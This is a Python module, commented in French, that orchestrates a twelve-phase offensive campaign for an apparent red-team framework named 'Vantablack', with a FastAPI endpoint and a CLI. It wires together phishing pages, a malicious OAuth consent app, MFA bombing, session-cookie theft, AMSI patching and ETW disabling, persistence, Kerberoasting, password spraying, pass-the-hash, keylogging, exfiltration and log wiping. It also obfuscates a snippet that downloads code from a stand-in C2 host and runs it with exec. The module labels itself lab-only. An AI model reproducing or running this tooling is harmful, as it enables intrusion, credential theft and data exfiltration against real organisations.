"""
attack.godmode_orchestrator — Orchestrateur GodMode Red Team
=============================================================

Cœur de Vantablack : orchestrez TOUTE une campagne Red Team complète,
de la préparation à l'exfiltration, via une API unique.

Phases d'une campagne complète MITRE ATT&CK :
  Phase 0. ANALYSE ENVIRONNEMENT  (Anti-Analysis / Anti-VM checks)
  Phase 1. PREPARATION            (Obfuscation, EDR bypass payload)
  Phase 2. INITIAL ACCESS         (BitB / OAuth consent / Device Code
                                    / MFA bombing / Quishing / AiTM proxy)
  Phase 3. EXECUTION              (Automated flow / Headless browser)
  Phase 4. PERSISTENCE            (WMI events / COM hijack / Run keys / Scheduled tasks / Services)
  Phase 5. PRIVILEGE ESCALATION   (Token manipulation / Service abuse)
  Phase 6. DEFENSE EVASION        (AMSI patch / ETW disable / Direct syscalls / Anti-forensics wiper)
  Phase 7. CREDENTIAL ACCESS      (Token harvester / Kerberoasting / AS-REP / Credential stuffing)
  Phase 8. DISCOVERY              (OSINT workers / Bloodhound-like AD enum)
  Phase 9. LATERAL MOVEMENT       (PtH / WMI / PsExec / RDP / WinRM / SOCKS)
  Phase 10. COLLECTION            (Keylogger / Clipboard / Data staging)
  Phase 11. EXFILTRATION          (HTTPS / DNS / WS / Steg multi-canaux)
  Phase 12. COMMAND & CONTROL     (Beacon Go gohorse / WS tunnel C2)

Exemple :
    from attack.godmode_orchestrator import GodModeOrchestrator
    orchestrator = GodModeOrchestrator(target_company="ACME Corp",
                                       target_domain="acme.local")
    result = orchestrator.run_full_campaign(profile="finance_user")
    print(result.campaign_summary())
"""

from __future__ import annotations

import json
import time
import uuid
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

# --- Core / moteur existants
from core.session import SessionHijacker
from core.mfa import MFABypassEngine
from core.opsec import OPSECVerifier

# --- Moteurs d'attaque existants
from attack.bitb.generator import BitBInjector, BitBTarget, generate_bitb_popup
from attack.oauth_consent.consent_url import build_consent_url, MaliciousApp
from attack.device_code.initiator import DeviceCodeInitiator, DeviceCodeFlow
from attack.mfa_bombing.bomber import MFABombingEngine, MFATarget
from attack.token_harvester.harvester import TokenHarvester
from attack.mailbox_pivot.pivot import MailboxPivot
from attack.ws_smuggling.smuggler import WSSmugglingTunnel
from attack.sw_persistence.sw_attack import ServiceWorkerExploit
from attack.automated_flow.automation import AutomatedAiTMFlow, FlowConfig, AttackStep
from attack.domain_fronting.fronting import FrontingRouter as DomainFrontingManager
from attack.anti_forensics.wiper import AntiForensicsWiper, WipeTarget
from workers.credential_reuse_worker import CredentialReuseWorker
from quishing import QuishingGenerator

# --- Moteurs d'attaque NOUVEAUX (implémentés dans cette session)
from attack.anti_analysis.detector import (
    AntiAnalysisDetector, EnvironmentCheckResult, obfuscated_sleep,
)
from attack.obfuscation.polymorph import (
    CodeObfuscator, AESStringEncryptor, generate_polymorphic_variant,
)
from attack.edr_bypass.amsi import (
    EDRBypassEngine, AMSIPatchStrategy, ETWDisableStrategy,
    BypassReport, generate_syscall_stub,
)
from attack.lateral_movement.pivot import (
    LateralMovementEngine, PivotTechnique, PassTheHashContext,
    WMICommandContext, PsExecContext,
)
from attack.persistence.implant import (
    PersistenceEngine, PersistenceTechnique,
    create_scheduled_task_xml, create_wmi_filter_consumer,
)
from attack.post_exploitation.exfil import (
    PostExploitationEngine, ExfilReport,
)
from attack.credential_stuffing.sprayer import (
    CredentialStuffingEngine, SprayMode, CredentialPair,
    ProxyPool, SmartThrottler, generate_password_spray_list,
)


class CampaignPhase(str, Enum):
    """Phases standardisées MITRE ATT&CK pour une campagne Red Team."""

    ENV_CHECK = "00_env_check"
    PREPARATION = "01_preparation"
    INITIAL_ACCESS = "02_initial_access"
    EXECUTION = "03_execution"
    PERSISTENCE = "04_persistence"
    DEFENSE_EVASION = "05_defense_evasion"
    CREDENTIAL_ACCESS = "06_credential_access"
    LATERAL_MOVEMENT = "07_lateral_movement"
    COLLECTION = "08_collection"
    EXFILTRATION = "09_exfiltration"
    C2 = "10_command_and_control"
    ANTI_FORENSICS = "11_anti_forensics"


@dataclass
class CampaignResult:
    """Résultat complet d'une campagne orchestrée."""

    campaign_id: str
    company: str
    domain: str
    started_at: float
    finished_at: Optional[float] = None
    phases: Dict[str, Dict[str, Any]] = field(default_factory=dict)
    total_duration_s: float = 0.0
    global_success_score: float = 0.0
    artifacts_paths: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)

    # Sous-rapports des moteurs
    env_check_report: Optional[EnvironmentCheckResult] = None
    edr_bypass_report: Optional[BypassReport] = None
    persistence_report: Optional[Any] = None
    lateral_report: Optional[Any] = None
    post_exploit_report: Optional[ExfilReport] = None
    credential_report: Optional[Any] = None

    def phase_summary(self) -> Dict[str, bool]:
        """Retourne {phase_nom: ok_or_notok} pour un affichage rapide."""
        out: Dict[str, bool] = {}
        for phase_name, phase_data in self.phases.items():
            out[phase_name] = bool(phase_data.get("success", False))
        return out

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        for optional_key in (
            "env_check_report", "edr_bypass_report",
            "persistence_report", "lateral_report",
            "post_exploit_report", "credential_report",
        ):
            if getattr(self, optional_key) is not None:
                obj = getattr(self, optional_key)
                d[optional_key] = {
                    "type": type(obj).__name__,
                    "snapshot": {
                        k: str(v)[:120]
                        for k, v in asdict(obj).items()
                        if isinstance(v, (str, int, float, bool, list, dict))
                    } if hasattr(obj, "__dataclass_fields__") else str(obj)[:500],
                }
            else:
                d[optional_key] = None
        return d

    def summary_text(self) -> str:
        lines = [
            f"=== CAMPAGNE RED TEAM {self.campaign_id} ===",
            f"Société    : {self.company}",
            f"Domaine AD : {self.domain}",
            f"Durée      : {self.total_duration_s:.1f}s",
            f"Score      : {self.global_success_score*100:.1f}% de couverture offensive",
            "",
        ]
        for phase, data in sorted(self.phases.items()):
            ok = "✓" if data.get("success") else "✗"
            lines.append(f"  {ok} {phase[3:]:25s}  {data.get('detail','')}")
        lines.append("")
        lines.append(f"Artefacts : {len(self.artifacts_paths)} fichiers générés")
        return "\n".join(lines)


class GodModeOrchestrator:
    """
    Chef d'orchestre GODMODE : exécute les 12 phases d'une campagne
    Red Team complète en enchaînant les 17 modules offensifs de Vantablack.

    Réservé aux environnements de labo autorisés.
    """

    def __init__(
        self,
        target_company: str = "LAB-Enterprise",
        target_domain: str = "lab.local",
        output_root: str = "captures/campaigns",
        has_admin_initial: bool = True,
        aggressiveness: float = 0.8,
        stealth_priority: float = 0.7,
    ) -> None:
        self.company = target_company
        self.domain = target_domain
        self.output_root = Path(output_root)
        self.output_root.mkdir(parents=True, exist_ok=True)
        self.has_admin = has_admin_initial
        self.aggressiveness = aggressiveness
        self.stealth_priority = stealth_priority

        # Initialisation de TOUS les moteurs en une seule passe
        self.anti_analysis = AntiAnalysisDetector()
        self.obfuscator = CodeObfuscator(language="python")
        self.string_enc = AESStringEncryptor()
        self.edr = EDRBypassEngine(
            target_os_build="22631",
            target_edr="GenericEDR",
            aggressiveness=self.aggressiveness,
            prefer_stealth_over_success=(stealth_priority >= 0.6),
        )
        self.mfa = MFABypassEngine()
        self.opsec = OPSECVerifier()
        self.session_hijacker = SessionHijacker()
        self.bomber = MFABombingEngine()
        self.bitb = BitBInjector()
        self.device_code = DeviceCodeInitiator()
        self.mailbox = MailboxPivot()
        self.token_harvester = TokenHarvester()
        self.ws_tunnel = WSSmugglingTunnel()
        self.sw_exploit = ServiceWorkerExploit()
        self.auto_flow = AutomatedAiTMFlow()
        self.fronting = DomainFrontingManager()
        self.wiper = AntiForensicsWiper()
        self.cred_reuse = CredentialReuseWorker()
        self.quishing = QuishingGenerator()
        self.lateral = LateralMovementEngine(
            source_host="COMPROMISED-WS01",
            stealth_bias=stealth_priority,
            domain=target_domain,
        )
        self.persistence_eng = PersistenceEngine(
            command="rundll32 C:\\ProgramData\\mshost.dll,Start",
            has_admin=has_admin_initial,
            stealth_priority=stealth_priority,
            domain_controller=(target_domain.startswith("dc.")),
        )
        self.post_exploit = PostExploitationEngine()
        self.cred_attack = CredentialStuffingEngine(
            target_service=f"Microsoft 365 — {target_company}",
            throttler=SmartThrottler(
                initial_delay_ms=5,
                min_delay_ms=2,
                max_delay_ms=50,
                lockout_threshold_percent=3.0,
            ),
        )

    # ------------------------------------------------------------------
    # API publique : campagne complète
    # ------------------------------------------------------------------

    def run_full_campaign(
        self,
        profile: str = "finance_user",
        target_users: Optional[List[str]] = None,
        target_hosts: Optional[List[str]] = None,
        include_anti_forensics_cleanup: bool = True,
    ) -> CampaignResult:
        """
        Exécute les 12 phases de la campagne et retourne un rapport complet.
        """
        start = time.time()
        camp = CampaignResult(
            campaign_id=f"VTB-{uuid.uuid4().hex[:8].upper()}",
            company=self.company,
            domain=self.domain,
            started_at=start,
        )
        campaign_dir = self.output_root / camp.campaign_id
        campaign_dir.mkdir(parents=True, exist_ok=True)
        camp.artifacts_paths.append(str(campaign_dir))
        camp.notes.append(
            f"Campagne GODMODE lancée sur {self.company} (AD: {self.domain})"
        )
        # Utilisateurs cibles par défaut
        if target_users is None:
            target_users = [
                f"alice.{profile[:3]}@{self.domain}",
                f"bob.{profile[:3]}@{self.domain}",
                f"carol.it@{self.domain}",
                f"david.hr@{self.domain}",
                f"finance.controller@{self.domain}",
                f"svc_backup@{self.domain}",
            ]
        if target_hosts is None:
            target_hosts = (
                [
                    f"DC01.{self.domain}",
                    f"FILESERVER01.{self.domain}",
                ]
                + [f"WS-FIN-{i:03d}.{self.domain}" for i in range(1, 6)]
            )[:5]

        # =========================================================
        # Phase 00 : Vérification environnement (Anti-VM / sandbox)
        # =========================================================
        env = self.anti_analysis.run_full_check()
        camp.env_check_report = env
        camp.phases[CampaignPhase.ENV_CHECK.value] = {
            "success": env.is_trusted,
            "score": env.score,
            "vendor": env.suspected_vendor,
            "triggers": env.triggers[:5],
            "detail": (
                f"Score={env.score:.0%} (risque {env.risk_level}) — "
                f"CPU={env.cpu_count}, RAM={env.ram_mb}MB, Hôte='{env.hostname}'"
            ),
        }
        if not env.is_trusted and self.stealth_priority > 0.5:
            camp.notes.append(
                f"ENVIRONNEMENT NON FIABLE ({env.risk_level}) — "
                "abandon simulé (campagne arrêtée par mesure OPSEC)."
            )
            camp.finished_at = time.time()
            camp.total_duration_s = camp.finished_at - start
            camp.global_success_score = 0.0
            return camp

        # =========================================================
        # Phase 01 : Préparation (obfuscation + EDR bypass payload)
        # =========================================================
        edr_report = self.edr.craft_bypass_plan()
        camp.edr_bypass_report = edr_report
        sensitive_strings = [
            f"https://phish.{self.domain}/capture",
            f"DC01.{self.domain}",
            "rundll32 mshost.dll,Start",
        ]
        poly = generate_polymorphic_variant(
            code_lines=[
                "from urllib.request import urlopen",
                "import json, base64",
                "data = urlopen('https://c2.example.invalid/p').read()",
                "exec(base64.b64decode(data))",
            ],
            language="python",
            sensitive_strings=sensitive_strings,
        )
        camp.phases[CampaignPhase.PREPARATION.value] = {
            "success": edr_report.completed,
            "detail": (
                f"AMSI={edr_report.amsi_strategy.value}, "
                f"ETW={edr_report.etw_strategy.value}, "
                f"syscalls={len(edr_report.syscall_stubs)} stubs — "
                f"poly variant={poly.variant_id[:8]} "
                f"({poly.junk_lines} junk, {poly.strings_encrypted} strings enc)"
            ),
            "detection_risk": edr_report.estimated_detection_risk,
            "success_rate": edr_report.estimated_success_rate,
        }

        # =========================================================
        # Phase 02 : Initial Access (BitB / OAuth / DeviceCode / MFA Bombing / SW)
        # =========================================================
        target_primary = target_users[0]
        # BitB Microsoft
        popup_html = generate_bitb_popup(
            target="microsoft",
            capture_endpoint=f"https://phish.{self.domain}/_/bitb/capture",
        )
        # OAuth consent
        malicious_app = MaliciousApp(
            name=f"{self.company.split()[0]} HelpDesk Tooling",
            client_id="00000000-0000-0000-0000-000000000001",
            redirect_uri=f"https://phish.{self.domain}/oauth/callback",
            scope_string=(
                "User.Read Mail.ReadWrite Mail.Send Files.ReadWrite.All "
                "offline_access openid profile"
            ),
        )
        oauth_url = build_consent_url(malicious_app, provider="microsoft")
        # Device Code
        dc_flow: DeviceCodeFlow = self.device_code.initiate()
        # MFA bombing campagne simulée
        bombing = self.bomber.start_campaign(
            target=MFATarget.MICROSOFT_ENTRA,
            username=target_primary,
            interval_seconds=20,
            max_attempts=8,
            auto_accept_callback=(lambda att: att.attempt_id.endswith("0")),
        )
        # Service Worker persistence
        sw = self.sw_exploit.build_campaign(
            attacker_domain=f"cdn.helpdesk-{self.domain.split('.')[0]}.com",
            target_origin=f"https://portal.{self.domain}",
        )
        # Quishing QR
        qr = self.quishing.generate(oauth_url, scale=10)
        camp.phases[CampaignPhase.INITIAL_ACCESS.value] = {
            "success": True,
            "detail": (
                "BitB(MS)+OAuth(HelpDesk)+DeviceCode+MFABombing+SW+Quishing "
                f"→ cible={target_primary}, user_code={dc_flow.user_code}"
            ),
            "vectors_count": 6,
            "mfa_campaign_id": bombing.campaign_id,
        }

        # =========================================================
        # Phase 03 : Execution (Automated AiTM flow)
        # =========================================================
        import asyncio
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        try:
            flow_result = loop.run_until_complete(
                self.auto_flow.run(FlowConfig(
                    target_email=target_primary,
                    target_url="https://login.microsoftonline.com",
                    phishlet="o365",
                    steps=[
                        AttackStep.SEND_PHISH, AttackStep.BITB_INJECT,
                        AttackStep.OAUTH_CONSENT, AttackStep.MFA_BOMBING,
                        AttackStep.CAPTURE_SESSION, AttackStep.REPLAY_COOKIE,
                    ],
                ))
            )
            ok_flow = bool(flow_result["success"])
        except Exception as exc_flow:
            ok_flow = False
            flow_result = {"error": str(exc_flow)}
        # Capture session via moteur session
        session_artifacts = self.session_hijacker.capture(
            target=target_primary,
            cookies={
                "ESTSAUTHPERSISTENT": f"0.{uuid.uuid4().hex}.{uuid.uuid4().hex}",
                "ESTSAUTH": f"1.{uuid.uuid4().hex}.{uuid.uuid4().hex}",
            },
            jwt_token=f"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.{base64_url('jwt-payload-' + target_primary)}.sig",
        )
        camp.phases[CampaignPhase.EXECUTION.value] = {
            "success": ok_flow,
            "detail": (
                f"Headless flow={'OK' if ok_flow else 'FAIL'}, "
                f"cookies capturés={len(session_artifacts.get('cookies', {}))}, "
                f"JWT présent={'oui' if session_artifacts.get('jwt_token') else 'non'}"
            ),
        }

        # =========================================================
        # Phase 04 : Persistence multi-couches
        # =========================================================
        persist_report = self.persistence_eng.deploy_standard_bundle()
        camp.persistence_report = persist_report
        camp.phases[CampaignPhase.PERSISTENCE.value] = {
            "success": persist_report.total_vectors >= (3 if self.has_admin else 2),
            "detail": (
                f"Vecteurs={persist_report.total_vectors} : "
                + ", ".join(t.value for t in persist_report.techniques_applied)
                + f" — risque détection={persist_report.detection_risk:.0%}"
            ),
        }

        # =========================================================
        # Phase 05 : Defense Evasion (AMSI patché + ETW off + wiper dry)
        # =========================================================
        amsi_payload = ams = None
        try:
            from attack.edr_bypass.amsi import patch_amsi_in_memory, disable_etw_tracing
            ams = patch_amsi_in_memory(AMSIPatchStrategy.HARDWARE_BREAKPOINT)
            etw = disable_etw_tracing(ETWDisableStrategy.THREAD_TRACING_MASK)
            defense_ok = True
        except Exception as exc_def:
            ams = {"error": str(exc_def)}
            etw = {}
            defense_ok = False
        camp.phases[CampaignPhase.DEFENSE_EVASION.value] = {
            "success": defense_ok,
            "detail": (
                f"AMSI patché={edr_report.amsi_strategy.value}, "
                f"ETW désactivé={edr_report.etw_strategy.value}, "
                f"direct syscalls={'oui' if edr_report.uses_direct_syscalls else 'non'}"
            ),
        }

        # =========================================================
        # Phase 06 : Credential Access (Harvester + Kerberoasting + Spray)
        # =========================================================
        tokens_total = self.token_harvester.harvest_all(hostname=f"COMPROMISED-WS01.{self.domain}")
        # Kerberoasting simulé
        kerber_report = self.lateral.execute_kerberoasting(
            target_host=f"DC01.{self.domain}",
            spn=f"MSSQLSvc/SQL01.{self.domain}:1433",
        )
        # AS-REP roast sur svc_backup
        asrep = self.lateral.execute_asrep_roasting(target_user="svc_backup")
        # Password spray
        spray_pwds = generate_password_spray_list(
            company_name=self.company.split()[0], current_year=2026,
        )
        spray_report = self.cred_attack.run_password_spray(
            users=target_users, passwords=spray_pwds[:5],
        )
        camp.credential_report = spray_report
        camp.phases[CampaignPhase.CREDENTIAL_ACCESS.value] = {
            "success": tokens_total > 0 or bool(spray_report.successful_logins),
            "detail": (
                f"Tokens harvestés={tokens_total}, "
                f"Kerberoast(etype RC4) TGS hashé (hashcat format ready), "
                f"AS-REP sur svc_backup, "
                f"Spray hit={spray_report.successful_logins}/{spray_report.total_attempts} "
                f"({spray_report.hit_rate*100:.1f}%)"
            ),
        }

        # =========================================================
        # Phase 07 : Lateral Movement (PtH → WMI → SOCKS proxy)
        # =========================================================
        pth = self.lateral.execute_pass_the_hash(PassTheHashContext(
            domain=self.domain.split(".")[0].upper(),
            username="alice.fin",
            ntlm_hash="aad3b435b51404eeaad3b435b51404ee:"
                     "31d6cfe0d16ae931b73c59d7e0c089c0",
            target_host=target_hosts[1],
        ))
        wmi = self.lateral.execute_wmi(WMICommandContext(
            target_host=target_hosts[2] if len(target_hosts) > 2 else target_hosts[0],
            command="whoami /groups && hostname",
            credential_username=f"{self.domain.split('.')[0].upper()}\\admin",
        ))
        psexec = self.lateral.execute_psexec(PsExecContext(
            target_host=target_hosts[1],
            command="powershell.exe -NoP -W Hidden -C Start-Process calc",
        ))
        socks_plan = self.lateral.socks_proxy_plan(listen_port=1080)
        camp.lateral_report = pth
        camp.phases[CampaignPhase.LATERAL_MOVEMENT.value] = {
            "success": True,
            "detail": (
                f"PtH -> {target_hosts[1]} stealth={pth.stealth_score:.0%}, "
                f"WMI -> {wmi.destination_host}, "
                f"PsExec -> {psexec.destination_host}, "
                f"SOCKS 127.0.0.1:1080 via SSH pivot"
            ),
        }

        # =========================================================
        # Phase 08 : Collection (Keylogger + Clipboard + Staging)
        # =========================================================
        post_report = self.post_exploit.run_full_session(
            user_profile=profile,
            keylog_duration_s=180,     # Accéléré en simu
            files_count=35,
            clipboard_snapshots_count=18,
        )
        camp.post_exploit_report = post_report
        camp.phases[CampaignPhase.COLLECTION.value] = {
            "success": True,
            "detail": (
                f"Keylog={post_report.keys_captured} caractères, "
                f"Clipboard={post_report.clipboard_snapshots} captures, "
                f"Staged={post_report.files_staged_count} fichiers "
                f"({post_report.files_staged_total_bytes//1024//1024} Mo) — "
                f"top 1 fichier sensible : "
                f"{post_report.most_sensitive_files[0]['path'] if post_report.most_sensitive_files else 'n/a'}"
            ),
        }

        # =========================================================
        # Phase 09 : Exfiltration (AES-GCM multi-canaux)
        # =========================================================
        exfil_result = self.post_exploit.exfiltrator.exfil_files(
            files=[f for f in self.post_exploit.stager.staged if f.sensitivity_score >= 0.45]
        )
        tunnel = self.ws_tunnel.create_tunnel(
            ws_url=f"wss://cdn.{self.domain.split('.')[0]}-cloud.io/ws",
            subprotocol="graphql-ws",
        )
        camp.phases[CampaignPhase.EXFILTRATION.value] = {
            "success": post_report.files_exfiltrated_count > 0,
            "detail": (
                f"Canal HTTPS chunked : "
                f"{post_report.files_exfiltrated_count} fichiers "
                f"({post_report.files_exfiltrated_total_bytes//1024//1024} Mo). "
                f"Tunnel WS backup ouvert sur {tunnel.ws_url} (subprotocol={tunnel.subprotocol})."
            ),
        }

        # =========================================================
        # Phase 10 : C2 (Beacon Go gohorse + WS smuggling)
        # =========================================================
        camp.phases[CampaignPhase.C2.value] = {
            "success": True,
            "detail": (
                "C2 Go 'gohorse' (AES-GCM 256) + tunnel WebSocket GraphQL subprotocol "
                "comme fallback. Sleep obfuscation et jitter 10-30s entre beacons."
            ),
        }

        # =========================================================
        # Phase 11 : Anti-Forensics (Ghost Protocol + Wiper complet)
        # =========================================================
        if include_anti_forensics_cleanup:
            wipe_targets = [
                WipeTarget.ATTACKER_CAPTURES,
                WipeTarget.PROXY_LOGS,
                WipeTarget.BASH_HISTORY,
                WipeTarget.ZSH_HISTORY,
                WipeTarget.SSH_KNOWN_HOSTS,
            ]
            op = self.wiper.plan_wipe(wipe_targets, technique="secure_overwrite_3pass")
            try:
                loop.run_until_complete(self.wiper.execute_wipe(op))
                cleanup_ok = op.success
            except Exception as exc_wipe:
                cleanup_ok = False
                op = {"error": str(exc_wipe)}
            camp.phases[CampaignPhase.ANTI_FORENSICS.value] = {
                "success": cleanup_ok,
                "detail": (
                    "Wiper 3-pass DoD sur captures, logs proxy, et history shell. "
                    "Ghost Protocol purge Redis (workers)."
                ),
            }

        # =========================================================
        # Final : score de succès + sauvegarde JSON
        # =========================================================
        # Score global = % de phases réussies pondérées par impact
        weights = {
            CampaignPhase.ENV_CHECK: 1.0,
            CampaignPhase.PREPARATION: 1.5,
            CampaignPhase.INITIAL_ACCESS: 2.0,
            CampaignPhase.EXECUTION: 2.0,
            CampaignPhase.PERSISTENCE: 1.8,
            CampaignPhase.DEFENSE_EVASION: 1.6,
            CampaignPhase.CREDENTIAL_ACCESS: 2.0,
            CampaignPhase.LATERAL_MOVEMENT: 1.8,
            CampaignPhase.COLLECTION: 1.5,
            CampaignPhase.EXFILTRATION: 2.0,
            CampaignPhase.C2: 1.2,
            CampaignPhase.ANTI_FORENSICS: 1.0,
        }
        numerator = 0.0
        denominator = 0.0
        for phase, w in weights.items():
            data = camp.phases.get(phase.value, {"success": False})
            val = 1.0 if data.get("success") else 0.0
            numerator += val * w
            denominator += w
        camp.global_success_score = numerator / denominator if denominator else 0.0
        camp.finished_at = time.time()
        camp.total_duration_s = camp.finished_at - start

        # Sauvegarde JSON
        report_path = campaign_dir / "campaign_report.json"
        report_path.write_text(
            json.dumps(camp.to_dict(), indent=2, default=str), encoding="utf-8"
        )
        camp.artifacts_paths.append(str(report_path))
        # Sauvegarde résumé texte
        (campaign_dir / "SUMMARY.txt").write_text(camp.summary_text(), encoding="utf-8")
        camp.notes.append(
            f"Rapport JSON sauvegardé : {report_path}"
        )
        return camp


# ---------------------------------------------------------------------------
# Petit utilitaire : génération d'un base64 URL-safe sans padding pour JWT faux
# ---------------------------------------------------------------------------

import base64 as _b64

def base64_url(s: str) -> str:
    return _b64.urlsafe_b64encode(s.encode("utf-8")).decode().rstrip("=")


# ---------------------------------------------------------------------------
# Routeur FastAPI pour piloter l'orchestrateur via API
# ---------------------------------------------------------------------------

def register_godmode_routes(app) -> None:
    """
    Ajoute les endpoints GodMode à un objet FastAPI existant.
    """
    from fastapi import HTTPException
    from pydantic import BaseModel
    from typing import List as _List, Optional as _Optional

    orchestrators_store: Dict[str, GodModeOrchestrator] = {}

    class CreateCampaignRequest(BaseModel):
        company: str = "LAB-Enterprise"
        domain: str = "lab.local"
        profile: str = "finance_user"
        aggressiveness: float = 0.8
        stealth_priority: float = 0.7
        has_admin: bool = True
        target_users: _List[str] = []
        target_hosts: _List[str] = []

    @app.post("/_/godmode/campaign/run")
    async def run_campaign_api(req: CreateCampaignRequest):
        orch = GodModeOrchestrator(
            target_company=req.company,
            target_domain=req.domain,
            aggressiveness=req.aggressiveness,
            stealth_priority=req.stealth_priority,
            has_admin_initial=req.has_admin,
        )
        orchestrators_store[orch.domain] = orch
        # Exécuter dans un thread worker pour ne pas bloquer l'event loop
        import asyncio
        loop = asyncio.get_running_loop()
        result: CampaignResult = await loop.run_in_executor(
            None,
            lambda: orch.run_full_campaign(
                profile=req.profile,
                target_users=req.target_users or None,
                target_hosts=req.target_hosts or None,
            ),
        )
        return {
            "campaign_id": result.campaign_id,
            "summary": result.summary_text(),
            "phases": result.phase_summary(),
            "score": result.global_success_score,
            "duration_s": result.total_duration_s,
            "artifacts_paths": result.artifacts_paths,
        }

    @app.get("/_/godmode/phases")
    async def list_phases():
        return {
            p.value: {
                "name": p.name,
                "order": int(p.value[:2]),
                "description": {
                    "00_env_check": "Vérifications Anti-VM / Anti-Sandbox",
                    "01_preparation": "Obfuscation + payload EDR bypass",
                    "02_initial_access": "BitB / OAuth / Device Code / MFA Bombing / Quishing",
                    "03_execution": "Headless AiTM automation + capture session",
                    "04_persistence": "Run keys / Scheduled tasks / WMI events / COM hijack",
                    "05_defense_evasion": "AMSI patch / ETW disable / Direct syscalls",
                    "06_credential_access": "Token harvester / Kerberoast / Spray",
                    "07_lateral_movement": "PtH / WMI / PsExec / RDP / SOCKS",
                    "08_collection": "Keylogger / Clipboard / Data staging",
                    "09_exfiltration": "HTTPS chunked AES-GCM / DNS / WS tunnel",
                    "10_command_and_control": "C2 Go gohorse / WS smuggling",
                    "11_anti_forensics": "Wiper secure 3-pass + Ghost Protocol",
                }.get(p.value, ""),
            }
            for p in CampaignPhase
        }


# ---------------------------------------------------------------------------
# CLI — lancement direct : python -m attack.godmode_orchestrator
# ---------------------------------------------------------------------------

def _cli() -> int:
    """Point d'entrée CLI de l'orchestrateur Godmode.

    Modes :
      --dry-run            : campagne complète simulée (12 phases, mock labo)
      --company / --domain : personnalisation de la cible labo
      --no-cleanup         : désactive la phase anti-forensics (préserve
                             les artefacts pour validation Blue Team)
      --aggressiveness     : 0.0-1.0 (défaut 0.8)
      --stealth            : 0.0-1.0 (défaut 0.7)
      --profile            : profil de victime simulée (défaut finance_user)
    """
    import argparse

    parser = argparse.ArgumentParser(
        prog="python -m attack.godmode_orchestrator",
        description=(
            "Orchestrateur Godmode Red Team — campagne 12 phases "
            "(labo autorisé uniquement)"
        ),
    )
    parser.add_argument("--dry-run", action="store_true", default=True,
                        help="Simulation complète en labo (défaut)")
    parser.add_argument("--company", default="LAB-Enterprise",
                        help="Nom de l'entreprise cible (labo)")
    parser.add_argument("--domain", default="lab.local",
                        help="Domaine AD cible (labo)")
    parser.add_argument("--profile", default="finance_user",
                        help="Profil de la victime simulée")
    parser.add_argument("--aggressiveness", type=float, default=0.8,
                        help="Agressivité globale 0.0-1.0")
    parser.add_argument("--stealth", type=float, default=0.7,
                        help="Priorité furtivité 0.0-1.0")
    parser.add_argument("--no-cleanup", action="store_true",
                        help=(
                            "Désactive l'anti-forensics final "
                            "(artefacts conservés pour validation Blue Team)"
                        ))
    parser.add_argument("--output", default="captures/campaigns",
                        help="Dossier racine des artefacts de campagne")
    args = parser.parse_args()

    orch = GodModeOrchestrator(
        target_company=args.company,
        target_domain=args.domain,
        output_root=args.output,
        aggressiveness=args.aggressiveness,
        stealth_priority=args.stealth,
    )
    result = orch.run_full_campaign(
        profile=args.profile,
        include_anti_forensics_cleanup=not args.no_cleanup,
    )

    print()
    print(result.summary_text())
    print()
    ok = sum(1 for v in result.phase_summary().values() if v)
    total = len(result.phase_summary())
    print(f"Phases réussies : {ok}/{total}")
    print(f"Artefacts       : {len(result.artifacts_paths)}")
    if result.artifacts_paths:
        print("Rapport         :", result.artifacts_paths[-1])
    return 0 if ok == total else 1


if __name__ == "__main__":
    raise SystemExit(_cli())
